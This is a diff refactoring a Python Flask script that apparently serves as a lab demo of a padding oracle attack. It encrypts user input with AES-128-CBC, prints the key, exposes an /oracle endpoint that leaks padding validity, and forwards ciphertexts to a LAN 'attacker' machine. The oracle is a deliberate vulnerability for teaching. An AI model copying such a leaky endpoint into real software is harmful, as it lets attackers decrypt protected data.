@@ -15,9 +15,9 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import requests as http_req
 
-# --- Hardcoded values ---
-BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
-KEY = os.urandom(16)                   # AES-128 key: 16 bytes, random each run
+# --- Config ---
+BLOCK_SIZE = 16
+KEY = os.urandom(16)
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5000
 ATTACKER_PORT = 5001
@@ -27,12 +27,10 @@ logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
 
 def fmt(data):
-    """Format bytes as space-separated decimal values."""
     return " ".join(str(b) for b in data)
 
 
 def get_local_ip():
-    """Best-effort LAN IP discovery for same-Wi-Fi testing."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         sock.connect(("8.8.8.8", 80))
@@ -43,34 +41,22 @@ def get_local_ip():
         sock.close()
 
 
+def valid_padding(block):
+    p = block[-1]
+    return 1 <= p <= BLOCK_SIZE and block[-p:] == bytes([p]) * p
+
+
 @app.route("/oracle", methods=["POST"])
 def oracle():
-    """The vulnerability: only tells if PKCS#7 padding is valid or not."""
-    data = request.get_json(force=True)
-    ct_hex = data.get("ciphertext", "")
-
     try:
-        ct_bytes = bytes.fromhex(ct_hex)
-    except ValueError:
-        return jsonify({"valid": False})
-
-    if len(ct_bytes) != 2 * BLOCK_SIZE:
-        return jsonify({"valid": False})
-
-    iv_part = ct_bytes[:BLOCK_SIZE]
-    ct_part = ct_bytes[BLOCK_SIZE:]
-
-    try:
-        cipher = AES.new(KEY, AES.MODE_CBC, iv=iv_part)
-        pt = cipher.decrypt(ct_part)
-        pad_byte = pt[-1]
-        if pad_byte < 1 or pad_byte > BLOCK_SIZE:
+        ct = bytes.fromhex(request.get_json(force=True).get("ciphertext", ""))
+        if len(ct) != 2 * BLOCK_SIZE:
             return jsonify({"valid": False})
-        valid = pt[-pad_byte:] == bytes([pad_byte] * pad_byte)
+        iv, block = ct[:BLOCK_SIZE], ct[BLOCK_SIZE:]
+        pt = AES.new(KEY, AES.MODE_CBC, iv=iv).decrypt(block)
+        return jsonify({"valid": valid_padding(pt)})
     except Exception:
-        valid = False
-
-    return jsonify({"valid": valid})
+        return jsonify({"valid": False})
 
 
 def main():
@@ -78,34 +64,23 @@ def main():
     attacker_ip = input("Enter attacker PC IP (blank for localhost): ").strip() or "127.0.0.1"
     attacker_url = f"http://{attacker_ip}:{ATTACKER_PORT}/capture"
 
-    t = threading.Thread(
+    threading.Thread(
         target=lambda: app.run(host=SERVER_HOST, port=SERVER_PORT, threaded=True),
         daemon=True,
-    )
-    t.start()
+    ).start()
 
     print("=" * 50)
-    print("  ENCRYPTION SERVER + PADDING ORACLE")
+    print("ENCRYPTION SERVER + PADDING ORACLE")
+    print(f"Key       : {fmt(KEY)}")
+    print(f"Oracle    : http://{local_ip}:{SERVER_PORT}/oracle")
+    print(f"Attacker  : {attacker_url}")
     print("=" * 50)
-    print(f"  Algorithm  : AES-128-CBC")
-    print(f"  Block size : {BLOCK_SIZE} bytes")
-    print(f"  Padding    : PKCS#7")
-    print(f"  Key        : {fmt(KEY)}")
-    print(f"  This PC IP : {local_ip}")
-    print(f"  Oracle     : http://{local_ip}:{SERVER_PORT}/oracle")
-    print(f"  Attacker   : {attacker_url}")
-    print("=" * 50)
-    print()
 
     while True:
         try:
-            msg = input("Enter plaintext (or 'quit'): ").strip()
+            msg = input("\nEnter plaintext (or 'quit'): ").strip()
         except (EOFError, KeyboardInterrupt):
-            print("\nInput closed. Oracle stays alive for attacker.")
-            try:
-                t.join()
-            except KeyboardInterrupt:
-                pass
+            print("\nInput closed.")
             return
 
         if not msg:
@@ -113,27 +88,21 @@ def main():
         if msg.lower() == "quit":
             break
 
+        raw = msg.encode()
+        padded = pad(raw, BLOCK_SIZE)
         iv = os.urandom(BLOCK_SIZE)
-        cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
-        padded = pad(msg.encode(), BLOCK_SIZE)
-        ct = cipher.encrypt(padded)
-        pad_count = len(padded) - len(msg.encode())
+        ct = AES.new(KEY, AES.MODE_CBC, iv=iv).encrypt(padded)
+        pad_count = len(padded) - len(raw)
 
-        print(f"\nPlaintext       : {msg}")
-        print(f"Plaintext bytes : {fmt(msg.encode())}")
-        print(f"PKCS#7 padding  : added {pad_count} byte(s) of value {pad_count}")
-        print(f"After padding   : {fmt(padded)} ({len(padded)} bytes, {len(padded)//BLOCK_SIZE} block(s))")
-        print(f"IV              : {fmt(iv)}")
-        print(f"Ciphertext      : {fmt(ct)}")
-        print(f"IV + Ciphertext : {fmt(iv + ct)}")
+        print(f"Plaintext  : {msg}")
+        print(f"Padding    : {pad_count} byte(s)")
+        print(f"IV+CT      : {fmt(iv + ct)}")
 
-        # send to attacker (hex is only used over the network, not shown to user)
         try:
-            http_req.post(attacker_url, json={"ciphertext": (iv+ct).hex()}, timeout=3)
-            print(f"Status          : Sent to attacker")
+            http_req.post(attacker_url, json={"ciphertext": (iv + ct).hex()}, timeout=3)
+            print("Status     : Sent to attacker")
         except Exception:
-            print(f"Status          : Attacker not running")
-        print()
+            print("Status     : Attacker not running")
 
 
 if __name__ == "__main__":
